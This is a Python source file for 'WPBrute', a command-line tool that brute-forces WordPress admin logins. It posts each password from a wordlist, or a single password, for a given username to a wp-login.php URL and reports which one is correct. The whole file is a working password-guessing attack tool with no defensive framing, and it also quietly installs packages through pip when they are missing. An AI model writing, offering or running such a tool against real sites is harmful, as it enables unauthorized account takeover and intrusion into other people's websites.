from threading import Thread
import os
import argparse

class Brute:
    def __init__(self, password, user, url, banner):
        self.url = url
        if 'wp-login.php' not in self.url:
            print('Invalid URL')
            exit()
        self.banner = banner
        print(banner)
        print("________________Checking modules________________")
        try:
            from requests import Session
            import colorama
            print('________________Checking complete_______________')
        except ImportError:
            print('________________Downloading modules________________')
            os.system('pip install requests colorama')
            from requests import Session
            import colorama
            print('________________Download complete________________')

        colorama.init(autoreset=True)
        self.user = user
        self.password = password
        self.session = Session()
        self._post = {'log': self.user,
                     'pwd': '',
                     'wp-submit': 'Войти',
                     'redirect_to': 'wp-admin/',
                     'testcookie': '1'
                     }
        self.thread = Thread(target=self.pass_list)
        self.thread.run()

    def pass_list(self):
        if '.txt' in self.password:
            self.list_passwords = list()
            with open(password, 'r') as f:
                self.passwords = f.readlines()
            f.close()
            for i in self.passwords:
                self.list_passwords.append(i.strip('\n'))
            self.requests()
        else:
            self.request()

    def requests(self):
        print('________________Start Bruteforce________________')
        for i in self.list_passwords:
            self._post['pwd'] = i
            self.r = self.session.post(self.url, self._post)
            if 'login_error' in self.r.text:
                print(f'{i}: incorrect')
            else:
                print(f'{i}: CORRECT')

    def request(self):
        self._post['pwd'] = self.password
        self.r = self.session.post(self.url, self._post)
        if 'login_error' in self.r.text:
            print(f'{self.password}: incorrect')
        else:
            print(f'{self.password}: correct')


if __name__ == '__main__':
    wpbrute ='''                                               ____                            _______ 
                  _    _    _  _____          | /\ \  _____  ___ ___ _________ | ____|
                 \ \  | |  / / | /\ \   ___   | \/ /  | /\ \ | | | | |__   __| | |___
                  \ \_| |_/ /  |_\/_/  |___|  | /\ \  | \/_/ | |_| |    | |    | |___
                   \_______/   |_|            |_\/_/  |_|\_\ |_____|    |_|    |_____|  
                                                                      ____   ____
                                                                       \ \   / /
                                                                        \ \_/ / __  /\  /|  /\ 
                                                                         \___/      \/=  |= \/ 
            '''
    parser = argparse.ArgumentParser(description='WPBrute v0.1.0')
    parser.add_argument('--url', default=None, help='Url for wp-admin.php')
    parser.add_argument('-u', default=None, help='Username for bruteforce')
    parser.add_argument('-p', default=None, help='List passwords or one password')
    args = parser.parse_args()
    password = args.p
    user = args.u
    url = args.url
    Brute(password, user, url, wpbrute)
